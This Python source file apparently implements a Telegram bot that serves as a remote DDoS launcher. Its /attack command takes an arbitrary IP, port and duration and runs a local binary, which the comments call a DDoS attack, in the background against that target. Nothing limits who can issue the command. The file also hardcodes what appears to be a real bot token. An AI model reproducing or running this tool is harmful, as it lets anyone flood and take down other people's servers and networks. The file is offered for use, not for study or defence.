import logging
import subprocess
import os
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackContext

# 🚀 Your Bot Token from BotFather
BOT_TOKEN = "7435166904:AAHZhEKdebC_dihWT6w5yfrTAaQSii1-UpA"

# 🔥 Logging Setup
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Set binary path (Make sure Moin is in the same folder as this script)
BINARY_PATH = "/home/jovyan/workspace/Moin"  # Change to correct location

# Function to check & fix binary permissions
def check_permissions():
    if not os.access(BINARY_PATH, os.X_OK):
        logger.info("🔧 Fixing permissions...")
        os.chmod(BINARY_PATH, 0o755)

# 🎯 Execute Binary (DDoS Attack - Non-Blocking)
def execute_binary(ip, port, time):
    check_permissions()  # Ensure permissions are correct
    command = [BINARY_PATH, ip, str(port), str(time)]
    try:
        subprocess.Popen(command)  # Runs attack in the background
        logger.info(f"✅ Attack started on {ip}:{port} for {time} seconds.")
    except Exception as e:
        logger.error(f"❌ Error executing binary: {e}")

# 🚀 /attack Command Handler
async def attack(update: Update, context: CallbackContext):
    try:
        logger.info(f"Received args: {context.args}")
        ip, port, time = context.args
        port = int(port)
        time = int(time)
        logger.info(f"Parsed IP: {ip}, Port: {port}, Time: {time}")

        execute_binary(ip, port, time)
        await update.message.reply_text(
            f"🔥 **Attack Launched!**\n🎯 Target: {ip}:{port}\n⏳ Duration: {time} sec"
        )
    except (IndexError, ValueError) as e:
        logger.error(f"Error in /attack command: {e}")
        await update.message.reply_text(
            "❌ Invalid usage!\n\n**Correct Format:**\n/attack <IP> <PORT> <TIME>"
        )

# 🎉 /start Command Handler
async def start(update: Update, context: CallbackContext):
    await update.message.reply_text(
        "🚀 **Welcome to Your Telegram Bot!**\n\n"
        "Use /attack <IP> <PORT> <TIME> to launch."
    )

# 🔧 Error Handler
async def error_handler(update: Update, context: CallbackContext):
    logger.error(f"⚠️ Error occurred: {context.error}")
    if update.message:
        await update.message.reply_text("❌ An error occurred. Please try again.")

# 🏆 Main Bot Function
def main():
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    # Command Handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))

    # Register Error Handler
    application.add_error_handler(error_handler)

    # 🚀 Start the Bot
    application.run_polling()

if __name__ == "__main__":
    main()